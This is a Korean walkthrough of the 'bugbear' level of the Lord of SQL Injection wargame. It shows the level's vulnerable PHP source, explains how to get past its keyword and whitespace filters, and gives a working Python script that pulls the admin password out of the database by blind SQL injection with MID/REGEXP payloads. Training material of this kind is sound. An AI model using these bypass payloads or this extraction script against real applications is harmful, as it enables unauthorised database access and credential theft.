# Lord of SQL Injection No.13 - bugbear

## 문제 출제 의도

`'`, `substr`, `ascii`, `=`을 대소문자 구분 없이 포함하지 않고 Blind SQL Injection을 하여 `pw`를 알아낼 수 있는지 확인한다.

## 소스 코드 분석

bugbear 문제의 php 소스 코드는 다음과 같다.
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
  if(preg_match('/\'|substr|ascii|=|or|and| |like|0x/i', $_GET[no])) exit("HeHe"); 
  $query = "select id from prob_bugbear where id='guest' and pw='{$_GET[pw]}' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_bugbear where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("bugbear"); 
  highlight_file(__FILE__); 
?>
```
-----

```php
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
  if(preg_match('/\'|substr|ascii|=|or|and| |like|0x/i', $_GET[no])) exit("HeHe"); 
```
* GET방식으로 pw를 받고, pw에 `prob`, `_`, `.`, `()` 가 들어 있으면 `No Hack ~_~`이 뜨고 문제 풀이에 실패한다.

* 또한, **대소문자 구분 없이** pw에 `'` 가 들어 있으면 `HeHe`가 뜨고 문제 풀이에 실패한다.

* 또한, **대소문자 구분 없이** no에 `'`, `substr`, `ascii`, `=`, `or`, `and`, `(공백)`, `like`, `0x` 가 들어 있으면 `HeHe`가 뜨고 문제 풀이에 실패한다.

```php
  $query = "select id from prob_bugbear where id='guest' and pw='{$_GET[pw]}' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_bugbear where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("bugbear"); 
```
* 받은 pw와 no가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.

* `$result['id']`에 "0"을 제외한 어떤 값이든 들어 있으면 응답에 "Hello "와 `$result[id]` 값을 붙인 문자열이 포함된다.

* 문제 풀이가 성공하는 조건은 '데이터베이스에서 받은 pw와 GET방식으로 전달받은 pw가 같음'이다. 즉, 실제 데이터베이스에 저장된 pw를 알아내서 전달해야 한다.

## addslashes
```php
string addslashes ( string $str )
```
* addslashes 함수는 데이터베이스 질의 등에서 처리할 필요가 있는 문자(홑따옴표('), 겹따옴표("), 백슬래시(\), NUL(NULL 바이트)) 앞에 백슬래시를 붙인 문자열을 반환한다.

* 따라서 `addslashes($_GET[pw])` 는 `$_GET[id]`에서 문자열 `홑따옴표('), 겹따옴표("), 백슬래시(\), NUL(NULL 바이트)`를 찾아 백슬래시를 앞에 붙인 문자열을 반환한다.

* php의 addslashes 함수에 대해 잘 모르겠다면 다음 링크를 참고하자.

* [PHP: addslashes - Manual](http://php.net/manual/kr/function.addslashes.php)

## 공백문자 대체

1. CR(Carriage Return) 이용

    ASCII Code 표를 살펴보면 16진수로 0x0D는 Carriage Return에 해당한다.

    이는 MySQL에서 공백으로 인식하는 문자들 중 하나이다.

2. LF(Line Feed)

    ASCII Code 표를 살펴보면 16진수로 0x0A는 Line Feed에 해당한다.

    이는 MySQL에서 공백으로 인식하는 문자들 중 하나이다.

3. Tab

    ASCII Code 표를 살펴보면 16진수로 0x09는 Tab에 해당한다.

    이는 MySQL에서 공백으로 인식하는 문자들 중 하나이다.

4. 주석

    MySQL에서 구문 사이에 주석을 넣으면 공백이 없어도 정상적으로 동작한다.
        
-----

## Solution
    
1. MID 함수, REGEXP 활용

    ```python
    import urllib.request
    from urllib.parse import quote

    key = ""

    pwlen = 0

    for i in range(1, 20):
        url = "http://los.eagle-jump.org/bugbear_431917ddc1dec75b4d65a23bd39689f8.php?no="
        data = '-1/**/||/**/length(pw)/**/regexp/**/"^{}$"#'.format(str(i)) # = 을 못쓰므로 LIKE 로 수정
        print(data)
        data = quote(data)
        re = urllib.request.Request(url + data)

        re.add_header(
            "User-agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36")
        re.add_header(
            "Cookie", "PHPSESSID=bb9ultdedrmse87p4473hmms81"
        )

        req = urllib.request.urlopen(re)

        if str(req.read()).find("Hello admin") != -1:
            pwlen = i
            print('pw length : ' + str(pwlen))
            break

    for i in range(1, pwlen + 1):
        for j in range(32, 127):
            url = "http://los.eagle-jump.org/bugbear_431917ddc1dec75b4d65a23bd39689f8.php?no="
            data = '-1/**/||/**/mid(pw,1,{})/**/regexp/**/"^{}$"#'.format(
                str(i), key + chr(j))
            print(data)
            data = quote(data)
            re = urllib.request.Request(url + data)

            re.add_header(
                "User-agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36")
            re.add_header(
                "Cookie", "PHPSESSID=bb9ultdedrmse87p4473hmms81"
            )

            req = urllib.request.urlopen(re)

            if str(req.read()).find("Hello admin") != -1:
                key += chr(j).lower()
                print(key)
                break
    print(key)
    ```

    이러한 코드를 실행하면 결과값으로 735c2773 를 출력한다.
    이를 GET방식으로 pw의 값으로 전달하면 풀린다.
    
    ```
    http://los.eagle-jump.org/bugbear_431917ddc1dec75b4d65a23bd39689f8.php?pw=735c2773
    ```